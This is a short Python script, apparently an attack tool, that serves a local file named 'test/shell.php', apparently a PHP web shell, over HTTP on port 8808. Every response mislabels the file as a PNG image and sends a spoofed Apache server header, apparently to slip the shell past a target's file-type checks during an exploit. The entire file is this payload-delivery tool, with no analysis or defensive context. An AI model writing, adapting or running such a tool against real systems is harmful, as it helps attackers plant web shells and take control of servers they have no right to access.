from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = 8808
shellfile = "test/shell.php"
body = b""

with open(shellfile,"rb") as f:
    body = f.read()

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    # def __init__(self, request: _RequestType, client_address: _RetAddress, server: BaseServer) -> None:
    #     super().__init__(request, client_address, server)
    protocol_version = "HTTP/1.1"
    close_connection = True
    server_version = "Apache/2.4.52 (Ubuntu)"

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.send_header("Accept-Ranges", "bytes")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

httpd = HTTPServer(('0.0.0.0', PORT), SimpleHTTPRequestHandler)
print("serving at port", PORT)
httpd.serve_forever()
